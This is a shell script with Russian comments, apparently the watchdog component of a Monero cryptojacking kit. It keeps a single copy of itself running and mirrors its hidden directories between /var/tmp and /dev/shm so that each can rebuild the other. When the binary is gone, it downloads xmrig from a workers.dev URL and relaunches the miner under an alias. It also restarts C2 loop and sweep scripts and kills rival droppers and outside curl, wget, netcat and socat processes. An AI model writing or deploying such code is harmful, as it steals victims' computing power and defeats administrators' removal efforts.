#!/bin/sh
# guardian.sh — сторож: singleton, полное самолечение, зачистка чужих дропперов.
# Скан /proc каждые 0.2 с. Чужой fetch/шелл убивается на 10-м обнаружении.
#
# Правки 2026-11-09:
#   * свои curl/wget больше не убиваются: исключение по C2-хосту, по endpoint
#     и по цепочке родителей (beacon/loop/fleet-agent);
#   * восстанавливается весь каталог из /dev/shm, а не только xmrig;
#   * майнер поднимается под алиасом b<sfx>, если он есть;
#   * поднимает не только svc m и loop, но и sweep (если тот умер).
#
# Совместим с fleet-agent.sh: работает с $D/svc.sh, $D/loop.sh, $D/xmrig, $D/c2list.
# Запуск: sh guardian.sh

D=/var/tmp/.kf
S=/dev/shm/.kf
PIDF="$D/.gpid"
MARK="${KF_MARK:-kf9}"

[ -d "$D" ] || mkdir -p "$D" 2>/dev/null
[ -d "$S" ] || mkdir -p "$S" 2>/dev/null

# --- singleton ---------------------------------------------------------------
if [ -f "$PIDF" ]; then
  old=$(cat "$PIDF" 2>/dev/null)
  if [ -n "$old" ] && [ -r "/proc/$old/cmdline" ]; then
    c=$(tr '\0' ' ' 2>/dev/null <"/proc/$old/cmdline")
    case "$c" in *guardian.sh*) exit 0 ;; esac
  fi
fi
for p in /proc/[0-9]*; do
  pid=${p#/proc/}
  [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline")
  case "$c" in *guardian.sh*) exit 0 ;; esac
done
printf '%s' "$$" > "$PIDF" 2>/dev/null
chmod 600 "$PIDF" 2>/dev/null

# --- окружение ---------------------------------------------------------------
EP=""
[ -f "$D/endpoint" ] && EP=$(cat "$D/endpoint" 2>/dev/null)
[ -f "$D/.beacon-endpoint" ] && EP="$EP $(cat "$D/.beacon-endpoint" 2>/dev/null)"
EPLIST="$EP"
C2LIST=""
[ -f "$D/c2list" ] && C2LIST=$(cat "$D/c2list" 2>/dev/null)
for _u in $C2LIST; do
  _h=$(printf '%s' "$_u" | sed 's#^[a-z]*://##; s#/.*##; s#:.*##')
  [ -n "$_h" ] && EPLIST="$EPLIST $_h"
done
WID="$MARK"
[ -s "$D/id" ] && WID=$(cat "$D/id" 2>/dev/null)

RIVAL='\.amq_|\.usr_4voh|beacon-dialer|\.kwork|\.nodebox|udev-helper|java_update|\.jvbd|\.sysjvd|\.scsi_eh|\.X0_lock|\.sysd-private|\.khp|nm-dog|MASKED_RUN|/dev/shm/\.'

alm() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
# Если обе копии бинаря удалены, сторож сам делает новую сетевую попытку.
fetch_miner() {
  [ -x "$D/xmrig" ] && return 0
  [ -f "$D/70-fetch.sh" ] && . "$D/70-fetch.sh"
  [ -f "$D/00-common.sh" ] && . "$D/00-common.sh"
  command -v kf_fetch_miner >/dev/null 2>&1 || return 1
  _fm_arch=$(kf_arch 2>/dev/null); _fm_machine=${_fm_arch#* }; _fm_arch=${_fm_arch%% *}
  [ -n "${_fm_machine:-}" ] || return 1
  _fm_urls=$(cat "$D/.miner.urls" 2>/dev/null)
  [ -n "$_fm_urls" ] || _fm_urls="https://edge-static.cdn-edge-e9d.workers.dev/xmrig-aarch64"
  # shellcheck disable=SC2086
  kf_fetch_miner "$D/xmrig" "$_fm_arch" "$_fm_machine" $_fm_urls
}

# --- полное восстановление каталога из tmpfs --------------------------------
restore() {
  [ -d "$D" ] || mkdir -p "$D" 2>/dev/null
  [ -d "$S" ] || return 0
  for f in "$S"/* "$S"/.[!.]*; do
    [ -e "$f" ] || continue
    b=${f##*/}
    case "$b" in xm.log|xm.log.*|.gpid|.agent.lock|.upd*) continue ;; esac
    [ -e "$D/$b" ] || cp -f "$f" "$D/$b" 2>/dev/null
  done
  chmod 700 "$D"/*.sh "$D"/xmrig "$D"/b[0-9a-z][0-9a-z][0-9a-z][0-9a-z] 2>/dev/null
  return 0
}

# обратное зеркало: если /dev/shm очистили, восстанавливаем его из $D.
# Без этого после wipe tmpfs следующий подъём из S был бы пустым до cron-тика.
mirror_back() {
  [ -d "$S" ] || mkdir -p "$S" 2>/dev/null
  [ -d "$S" ] || return 0
  for f in "$D"/*.sh "$D/xmrig" "$D/c.json" "$D/flags" "$D/id" "$D/c2list" \
           "$D/.inst" "$D/.wallet" "$D/.alias" "$D/.alias.name" "$D/.kit.ver" "$D/.cron_ok" \
           "$D/.md_dir" "$D/.md_bin" "$D/.no_sweep" "$D/.bin.tag" "$D/.cfg.tag" "$D/.beacon-endpoint"; do
    [ -e "$f" ] || continue
    b=${f##*/}
    if [ ! -e "$S/$b" ]; then
      cp -f "$f" "$S/$b" 2>/dev/null
    elif [ -f "$f" ] && [ "$(wc -c < "$f" 2>/dev/null)" != "$(wc -c < "$S/$b" 2>/dev/null)" ]; then
      # файл обновился (kf_self_update) — подтягиваем свежую версию
      cp -f "$f" "$S/$b" 2>/dev/null
    fi
  done
  chmod 700 "$S"/*.sh 2>/dev/null
  return 0
}

miner_bin() {
  _mb=$(cat "$D/.alias" 2>/dev/null)
  if [ -n "$_mb" ] && [ -x "$_mb" ]; then printf '%s' "$_mb"; return 0; fi
  [ -x "$D/xmrig" ] && { printf '%s' "$D/xmrig"; return 0; }
  return 1
}

# --- свои процессы не трогаем ------------------------------------------------
_exempt_cmd() {
  case "$1" in
    *"$D"*|*"$S"*|*guardian.sh*) return 0 ;;
  esac
  for _t in $EPLIST; do
    [ -n "$_t" ] || continue
    case "$1" in *"$_t"*) return 0 ;; esac
  done
  return 1
}

# родитель (до 5 уровней) — наш скрипт? Нужно для curl, который качает кит:
# в его cmdline нет $D, но родитель — fleet-agent.sh / beacon.sh / loop.sh
_own_anc() {
  _oa_p="$1"; _oa_i=0
  while [ "$_oa_i" -lt 5 ]; do
    _oa_s=$(cat "/proc/$_oa_p/stat" 2>/dev/null) || return 1
    _oa_pp=$(printf '%s' "$_oa_s" | sed 's/.*) //' | awk '{print $2}')
    [ -n "$_oa_pp" ] && [ "$_oa_pp" != "0" ] || return 1
    _oa_c=$(tr '\0' ' ' 2>/dev/null < "/proc/$_oa_pp/cmdline")
    case "$_oa_c" in *"$D"*|*"$S"*|*beacon.sh*|*loop.sh*|*fleet-agent.sh*) return 0 ;; esac
    _oa_p="$_oa_pp"; _oa_i=$((_oa_i+1))
  done
  return 1
}

i=0
while :; do
  i=$((i + 1))
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    [ "$pid" = "$$" ] && continue
    c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline") || continue
    [ -n "$c" ] || continue

    _exempt_cmd "$c" && continue

    printf '%s' "$c" | grep -qE "$RIVAL" && { kill -9 "$pid" 2>/dev/null; continue; }

    if printf '%s' "$c" | grep -qE 'curl|wget|dev/tcp|pty.spawn|nc -e|ncat|socat'; then
      # свой загрузчик не режем: цепочка родителей ведёт в наш каталог
      _own_anc "$pid" && continue
      key="s$pid"
      n=$(eval "echo \${$key:-0}")
      n=$((n + 1))
      eval "$key=$n"
      if [ "$n" -ge 10 ]; then kill -9 "$pid" 2>/dev/null; eval "unset $key"; fi
    fi
  done

  # самолечение: каталог, бинарь, майнер, супервизор, бекенд-цикл, sweep
  restore
  BIN=$(miner_bin 2>/dev/null)
  if [ -z "$BIN" ] && [ ! -x "$S/xmrig" ]; then
    fetch_miner >/dev/null 2>&1 || true
    if [ -x "$D/xmrig" ] && command -v kf_miner_alias >/dev/null 2>&1; then
      kf_miner_alias "$D" "$(cat "$D/.md_bin" 2>/dev/null)" 2>/dev/null || true
    fi
    BIN=$(miner_bin 2>/dev/null)
  fi
  if [ -s "$D/c.json" ] && [ -n "$BIN" ] && ! alm "$BIN -c"; then
    if mkdir "$D/.mlock" 2>/dev/null; then
      printf '%s' "$$" > "$D/.mlock/pid" 2>/dev/null
      [ -s "$D/flags" ] || printf '%s' "--threads=$(nproc 2>/dev/null || echo 1)" > "$D/flags" 2>/dev/null
      detach nice -n 19 "$BIN" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null)
      sleep 2
      rm -rf "$D/.mlock" 2>/dev/null
    else
      _lp=$(cat "$D/.mlock/pid" 2>/dev/null)
      if [ -z "$_lp" ] || ! kill -0 "$_lp" 2>/dev/null \
         || [ -n "$(find "$D/.mlock" -maxdepth 0 -mmin +0 2>/dev/null)" ]; then
        rm -rf "$D/.mlock" 2>/dev/null
      fi
    fi
  fi
  alm "$D/svc.sh m" || detach sh "$D/svc.sh" m
  [ -n "$C2LIST" ] && { alm "$D/loop.sh" || detach sh "$D/loop.sh" "$WID" $C2LIST; }
  [ -x "$D/sweep.sh" ] && [ ! -f "$D/.no_sweep" ] && { alm "$D/sweep.sh" || detach sh "$D/sweep.sh" "$(cat "$D/.md_dir" 2>/dev/null)" "$(cat "$D/.md_bin" 2>/dev/null)" "$WID"; }

  if [ $((i % 50)) -eq 0 ]; then
    printf '%s' "$$" > "$PIDF" 2>/dev/null
    mirror_back
  fi
  sleep 0.2 2>/dev/null || sleep 1
done
